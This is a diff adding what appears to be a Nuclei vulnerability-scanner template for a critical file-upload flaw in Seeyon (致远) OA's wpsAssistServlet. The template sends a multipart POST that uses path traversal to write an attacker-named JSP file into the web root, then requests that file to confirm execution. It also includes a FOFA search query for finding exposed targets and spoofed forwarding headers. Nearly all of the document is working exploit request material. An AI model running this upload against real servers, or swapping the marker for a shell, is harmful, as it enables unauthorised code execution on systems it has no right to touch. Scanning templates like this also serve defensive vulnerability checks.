@@ -1,0 +1,61 @@
+id: seeyon-wpsAssistServlet-fileupload
+
+info:
+  name: 致远 wpsassistservlet - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="seeyon/index.jsp"
+  tags: seeyon,fileupload,oa
+
+
+variables:
+  marker: "{{randstr}}"
+  filename: "{{randbase(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{filename}}.jsp&fileId=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+        Accept-Encoding: gzip
+
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <%@ page import="java.util.Base64" %><%= new String(Base64.getDecoder().decode("{{base64(marker)}}"), "UTF-8") %>
+        --59229605f98b8cf290a7b8908b34616b--
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "officeTransResultFlag"
+          - '"success":true'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{marker}}"
